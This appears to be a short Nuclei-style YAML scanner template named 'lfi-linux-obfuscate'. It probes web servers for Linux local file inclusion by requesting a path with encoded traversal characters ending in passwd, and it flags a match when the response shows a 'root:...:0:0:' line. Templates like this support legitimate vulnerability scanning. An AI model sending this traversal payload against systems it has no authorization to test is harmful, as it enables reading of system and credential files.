http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/%FF%2E%FF%2E/passwd'
  stop-at-first-match: true
id: lfi-linux-obfuscate
info:
  author: reewardius
  name: Linux Obfuscate - Local File Inclusion
  severity: high
  tags: lfi,lfr,generic
